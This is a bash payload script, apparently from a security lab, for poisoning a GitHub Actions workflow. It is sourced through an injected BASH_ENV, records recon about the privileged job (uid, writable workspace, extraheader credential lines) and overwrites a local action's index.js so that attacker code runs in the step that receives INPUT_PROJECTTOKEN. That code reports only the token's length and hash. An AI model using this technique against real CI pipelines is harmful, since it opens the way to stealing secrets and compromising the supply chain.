# Inert marker payload. Sourced by non-interactive bash because $BASH_ENV points here.
if [ -z "${LAB_PAYLOAD_RAN:-}" ]; then
  export LAB_PAYLOAD_RAN=1
  {
    echo "### [payload] BASH_ENV payload executed in the privileged job"
    echo ""
    echo "- pid \`$$\`, uid \`$(id -u)\`, cwd \`$(pwd)\`"
    echo "- run \`${GITHUB_RUN_ID:-?}\`, event \`${GITHUB_EVENT_NAME:-?}\`, repo \`${GITHUB_REPOSITORY:-?}\`"
    echo "- injected \`BASH_ENV\` = \`${BASH_ENV:-unset}\`"
    echo "- first \$GITHUB_ENV entry \`BUNDLE_BRANCH\` = \`${BUNDLE_BRANCH:-unset}\`"
    echo "- workspace writable: $(test -w "${GITHUB_WORKSPACE:-/nonexistent}" && echo yes || echo no)"
    echo "- lines matching 'extraheader' in .git/config: $(grep -c extraheader "${GITHUB_WORKSPACE}/.git/config" 2>/dev/null || echo 0)"
    echo "- LAB_CANARY visible to this process: $( [ -n "${LAB_CANARY:-}" ] && echo yes || echo no )"
  } | tee -a "${GITHUB_STEP_SUMMARY:-/dev/null}"

  # Attacker code also sits next to repository files, because the archive was unzipped
  # inside the checkout. Replace the local action's entry point so attacker code runs in
  # the later step that is handed the secret. It reports only a length and a SHA-256.
  AC="${GITHUB_WORKSPACE}/.github/actions/secret-consumer/index.js"
  if [ -f "$AC" ]; then
    cat > "$AC" <<'JS'
const crypto = require('crypto')
const fs = require('fs')
const t = process.env.INPUT_PROJECTTOKEN || ''
const lines = [
  '### [payload] attacker code running inside the secret-bearing step',
  '',
  '- INPUT_PROJECTTOKEN present: ' + (t.length > 0),
  '- length: ' + t.length,
  '- sha256: ' + crypto.createHash('sha256').update(t).digest('hex'),
  '- INPUT_* names in this process: ' + Object.keys(process.env).filter((k) => k.startsWith('INPUT_')).join(','),
  ''
]
fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, lines.join('\n'))
console.log(lines.join('\n'))
console.log('[payload] fingerprinted the supplied token without printing it')
JS
    echo "- overwrote \`.github/actions/secret-consumer/index.js\`: yes" >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
  fi
fi
